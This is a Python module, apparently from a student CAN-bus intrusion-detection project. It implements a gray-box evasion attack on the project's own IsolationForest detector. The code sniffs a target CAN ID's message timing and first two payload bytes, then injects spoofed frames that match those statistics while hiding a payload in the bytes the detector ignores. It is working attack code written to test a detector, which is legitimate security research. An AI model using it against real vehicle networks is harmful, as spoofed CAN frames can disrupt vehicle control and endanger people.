# Author: Rayan Hamour (22103817)
"""
Gray-box adversarial evasion attack against the ML (IsolationForest)
detector: rather than randomising the injected payload/timing (which
produces the extreme outliers carnet.ids.anomaly.AnomalyIDS is built to
catch), this attacker first passively observes legitimate traffic on the
target ID to learn its typical inter-arrival time and first-two-payload-byte
statistics - exactly the three features AnomalyIDS scores on - then crafts
injected frames that match those statistics closely. The attacker never
needs access to the trained model itself (a gray-box, not white-box, threat
model): observing the bus is enough, since CAN is broadcast.

The actual malicious payload is carried in bytes 2-7, outside the two
bytes the detector's feature set inspects - a deliberately narrow, honest
illustration of a feature-blind-spot evasion, not a claim that this
defeats ML-based detection in general.

Observation and injection are split into two public functions
(observe_signal_stats, inject_with_stats) rather than one combined call.
That lets a caller reuse learned stats across several injection runs, and
lets tests isolate the injection phase from whatever traffic was present
during observation - useful when measuring how detectable the injected
messages are on their own, without legitimate traffic in the same window
confounding the count.
"""

from __future__ import annotations

import random
import statistics
import time
from dataclasses import dataclass

import can

from carnet.can.bus import create_bus


class _StatsListener(can.Listener):
    def __init__(self, target_id: int, max_samples: int):
        self.target_id = target_id
        self.max_samples = max_samples
        self.inter_arrivals: list[float] = []
        self.byte0s: list[int] = []
        self.byte1s: list[int] = []
        self._last_t: float | None = None

    def on_message_received(self, msg: can.Message) -> None:
        if msg.arbitration_id != self.target_id or len(self.inter_arrivals) >= self.max_samples:
            return
        now = time.monotonic()
        if self._last_t is not None:
            self.inter_arrivals.append(now - self._last_t)
        self._last_t = now
        if len(msg.data) > 0:
            self.byte0s.append(msg.data[0])
        if len(msg.data) > 1:
            self.byte1s.append(msg.data[1])

    @property
    def ready(self) -> bool:
        return len(self.inter_arrivals) >= 10


@dataclass
class SignalStats:
    mean_gap_s: float
    stdev_gap_s: float
    byte0_choices: list[int]
    byte1_choices: list[int]
    observed_samples: int


def observe_signal_stats(bus: can.Bus, target_id: int, observation_s: float) -> SignalStats | None:
    """Passively listen for `observation_s` and learn the target ID's
    inter-arrival and payload-byte statistics. Returns None if too few
    messages were observed to learn anything meaningful."""
    tap_bus = create_bus()
    listener = _StatsListener(target_id, max_samples=200)
    notifier = can.Notifier(tap_bus, [listener])
    time.sleep(observation_s)
    notifier.stop()
    tap_bus.shutdown()

    if not listener.ready:
        return None

    mean_gap = statistics.mean(listener.inter_arrivals)
    stdev_gap = statistics.pstdev(listener.inter_arrivals) or mean_gap * 0.1
    return SignalStats(
        mean_gap_s=mean_gap,
        stdev_gap_s=stdev_gap,
        byte0_choices=listener.byte0s or [0],
        byte1_choices=listener.byte1s or [0],
        observed_samples=len(listener.inter_arrivals),
    )


def inject_with_stats(
    bus: can.Bus,
    target_id: int,
    duration_s: float,
    stats: SignalStats,
    injected_payload_marker: bytes,
) -> int:
    """Send frames for `duration_s`, timed and valued to match `stats`.
    Returns the number of frames actually sent."""
    sent = 0
    end_time = time.monotonic() + duration_s
    while time.monotonic() < end_time:
        gap = max(0.001, random.gauss(stats.mean_gap_s, stats.stdev_gap_s))
        time.sleep(gap)
        byte0 = random.choice(stats.byte0_choices)
        byte1 = random.choice(stats.byte1_choices)
        data = bytes([byte0, byte1]) + injected_payload_marker[:6].ljust(6, b"\x00")
        msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
        try:
            bus.send(msg)
            sent += 1
        except can.CanError:
            pass
    return sent


def run_adversarial_ml_evasion_attack(
    bus: can.Bus,
    target_id: int,
    duration_s: float,
    observation_s: float,
    injected_payload_marker: bytes,
) -> dict:
    """Convenience wrapper: observe then inject in one call, against the
    same bus. See observe_signal_stats/inject_with_stats to run the two
    phases separately (e.g. against different traffic conditions)."""
    stats = observe_signal_stats(bus, target_id, observation_s)
    if stats is None:
        return {"sent": 0, "observed_samples": 0, "learned_stats": False}

    sent = inject_with_stats(bus, target_id, duration_s, stats, injected_payload_marker)
    return {
        "sent": sent,
        "observed_samples": stats.observed_samples,
        "learned_stats": True,
        "mean_gap_ms": stats.mean_gap_s * 1000,
    }
